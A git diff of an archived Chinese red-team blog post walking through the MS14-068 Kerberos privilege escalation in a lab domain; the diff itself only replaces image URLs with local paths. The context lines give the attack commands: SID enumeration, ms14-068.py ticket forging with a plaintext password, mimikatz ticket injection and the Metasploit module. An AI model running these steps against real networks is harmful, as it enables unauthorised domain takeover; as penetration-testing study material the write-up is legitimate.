@@ -67,7 +67,7 @@ schema_version: "1"
 
 一个专注于红队攻击的公众号
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/ed37905fc78cae29fdb39c3d2c48d5d2b9708c7e2c1a14f0b6077ed379265569.jpg)
 
   
 
@@ -75,7 +75,7 @@ schema_version: "1"
 
 大家好，这里是 **渗透攻击红队** 的第 **36** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/4039fb7f6b146028699e705fb2ffb22604a0e5a568f044857cc4ec6a458cc007.gif)
 
 简介
 
@@ -103,7 +103,7 @@ PyKEY 是一个利用 Kerberos 协议进行渗透测试的工具包。
 
 ms14-068.py 是 PyKEY 工具包中的 MS14-068 漏洞利用脚本。 
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxPuW4M2Q1cfYvHJCkRwKRdEwn9jNJgoj6ysSsLJ0GSagLGxJLlnQOmQ/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/f390539199e98edbdfe7c0a9d1aed9dd608e07b848c4a2df88c2d97c73eb13d8.png)
 
 ```
 -u：用户名@域名
@@ -121,7 +121,7 @@ ms14-068.py 是 PyKEY 工具包中的 MS14-068 漏洞利用脚本。
 wmic qfe get hotfixid
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxxYRdQSCn5SiaPU8N9eP0Oqcf3stTGFAgxNeTibmEmKLAHY8oFYpgtZng/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/cd0426a29e8c52186d80d5a5e3dd1310b09731a61d3761ce92c32ec0f0527968.png)
 
 可以看到域控机器没有安装补丁。
 
@@ -133,7 +133,7 @@ wmic qfe get hotfixid
 whoami /user
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxdtMPTKS8aKiaodR2L90tebE4CNV8LKVEMnfXHVO8DezhFkaIgtsCx3Q/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/289689688ab1c58cee2a53eba4edb9fe69394a1b8ef85db75b0d548fb05167d5.png)
 
 还可以使用这条命令获取域内所有用户的 SID：
 
@@ -141,7 +141,7 @@ whoami /user
 wmic useraccount get name,sid
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxwBjR4Or5LNeuiamwKBEEtAUMUZJpJ6dlXs5NQ3xNTiaj2EoRqmDtUzwQ/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/ccced8295378dd67731822313d3c183be36873313fed9bcb7f601d8cbd758631.png)
 
 #### 生成高权限票据
 
@@ -167,7 +167,7 @@ mary 的 sid：S-1-5-21-1218902331-2157346161-1782232778-1124
 ms14-068.py -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.2.25 -p admin!@#45
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxUQMCRdUrxUJrBkibTapfkkxPiaMZCfZJnkvphIicmgUlOjNMbCTINjDkA/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/c66b470839f9c6bc8bfbf12e6126281eaeb40c18e5e121cdda49a9268b9ac9f7.png)
 
 之后会在当前路径下生成一个名为 ：TGT_mary@god.org.ccache 的票据文件。
 
@@ -179,7 +179,7 @@ ms14-068.py -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d
 dir \\OWA2010CN-God\c$
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxiaLyfugBcn0w1Rib1k5ibJStyvuBFic5qOwEtj5iblcCE3TicbCslm8kByww/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/2d5752f005d139226eed21bfadd57aa52b4d4c93700e469252c8e8c3eaa3a5f5.png)
 
 #### 清除内存中所有票据
 
@@ -189,7 +189,7 @@ dir \\OWA2010CN-God\c$
 kerberos::purge
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxFnybBZZ670zw4x1nJqku5CnYOCr8KSKbf0icvumyvg26UvlWpE6vkhw/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/2f449abc34f9643e591228e6c1877bcd7364264931503b035938dc8d7b45f060.png)
 
 #### 将高权限票据注入内存
 
@@ -200,7 +200,7 @@ kerberos::ptc "票据文件"
 kerberos::ptc "TGT_mary@god.org.ccache"
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxmnJdZSbkPL5y1oLyMDGQSp9F6iawq1EPsv7bIogwiagbo30w7nbfq2ww/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/c73cf47e229cf956836fea2d7984b15d7eceac6336f56c6c7895d9399402bbe5.png)
 
 显示 Injecting ticket：OK ，表示注入成功！
 
@@ -212,7 +212,7 @@ kerberos::ptc "TGT_mary@god.org.ccache"
 dir \\OWA2010CN-God\c$
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxwzBQFbLqdgUckc1HVzqHZCp6UCod0KuEHbmuHM65rtIY684ELa0Nrw/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/3eec9162a2a45c6d9927e090e45e08d0d3df92b91882e3f68c3b9b4dc244cf09.png)
 
 **Metasploit 中进行测试**
 
@@ -222,7 +222,7 @@ dir \\OWA2010CN-God\c$
 use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxNXyF3D7eZqr8oMfrVLsJIyBbeXhjCpAQB4TVX7mMY1FDdxtewazbSw/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/21c7d4751cbcf3934adab6d3ed2065769798f0f19d3fbdd19bfd2533f475fe0a.png)
 
 它只需要输入域名、被提权用户的密码、被提权用户、被提权用户的 SID，域控制器的 IP：
 
@@ -245,7 +245,7 @@ set rhosts 192.168.2.25
 run
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxEBv8GWI2ZX0YbsJib43jGm2ZRGUic5w6uxbDyAV8o38jW205h5fYFeGQ/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/f5db93787f2adbe173e89f9800a7d913c14d32854258c239c1c1b2460dd12f92.png)
 
 运行之后，会在 /root/.msf4/loot 目录下 生成文件：20201110021544_default_192.168.2.25_windows.kerberos_988070.bin
 
@@ -255,17 +255,17 @@ run
 kerberos::clist "20201110021544_default_192.168.2.25_windows.kerberos_988070.bin" /export
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxwCzuIYUUyXm69MgbvTJqoGn3DBuNmNSL4eC4g1azpLkibGEXlqyjmRg/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/77132c41f1aefed432b7477461d254064377c16cc22768c4fc997716d7c316b9.png)
 
 这个时候转换成了：0-00000000-mary@krbtgt-GOD.ORG.kirbi 文件，我移动到了 Kali 的 / root 目录下，一会好操作！
 
 首先需要让域用户 mary win7 上线 MSF：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxNY4tSia1y3JVACMSgtjF92ymtYWibfF1SVcszMVjLz5OhNdvm1KSY6pg/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/6a85b4c5f974afc0a9c31525c2fd5472ec19009c5c9efcf6aee9b6f67e84976e.png)
 
 输入 load kiwi 命令加载 mimikatz：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxCxkbTsA6JPg2mr1icbs6Wk3nLWQCUicic8vrLWp3B3w2GMwQHhpVib6K1A/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/b9c269891c42078eefd3e248aef48ef663482be477c7f505f6caf3f6243b1601.png)
 
 然后输入命令导入票据：
 
@@ -273,7 +273,7 @@ kerberos::clist "20201110021544_default_192.168.2.25_windows.kerberos_988070.bin
 kerberos_ticket_use /root/0-00000000-mary@krbtgt-GOD.ORG.kirbi
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxiaSyL1C76VTxynenxLrGKVLBEMmDaHEU9Bo8hyH3uFXIAiambvNGZUIA/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/7b4f42c8dc31db1d77d3ee517188dcd23471b12016526658848d3c42047e14bf.png)
 
 之后切换后台 bakcgroud ，使用模块进行高权限票据提权：
 
@@ -301,23 +301,23 @@ run
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/40aaad22af7f44171fc001f77fa3df3da580afe10e64b4cc679d75fa1c5f4216.png)  
 
 渗透攻击红队
 
 一个专注于渗透红队攻击的公众号
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/6000a3ad558dc18ae4b4980bde36eb585a8d9f3d666cc3abdead339eb8cffaab.jpg)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/e95bab6e8a2e21887ae7bd2f4bf4109d6d4eab2f18fa7c6853fb9da8fa74d1b7.png)
 
 点分享
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/b94311534c431311a6b30af2eb40adb7d08ac2cc847224be0eca88249eaeb004.png)
 
 点点赞
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/d8f09d4871dad8ed82fb357f065af25d92a2878593cdb206a4e08096012678cc.png)
 
 点在看
 
